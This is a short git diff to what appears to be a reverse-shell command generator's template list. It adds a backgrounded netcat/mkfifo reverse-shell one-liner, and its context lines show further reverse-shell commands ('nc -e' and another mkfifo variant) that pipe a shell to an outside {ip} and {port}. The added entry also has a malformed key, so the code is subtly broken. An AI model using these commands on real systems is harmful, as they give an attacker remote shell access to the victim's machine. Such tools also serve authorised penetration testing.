@@ -50,6 +50,11 @@ const reverseShellCommands = withCommandType(
             "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
             "meta": ["linux", "mac"]
         },
+	{
+           "name:" "mkfifo background",
+	   "command": "(mkfifo \/tmp\/MmE1M; nc {ip} {port} 0<\/tmp\/MmE1M | {shell} >\/tmp\/MmE1M 2>&1; rm \/tmp\/MmE1M) &",
+	   "meta": ["linux", "mac"]
+	},
         {
             "name": "nc -e",
             "command": "nc -e {shell} {ip} {port}",
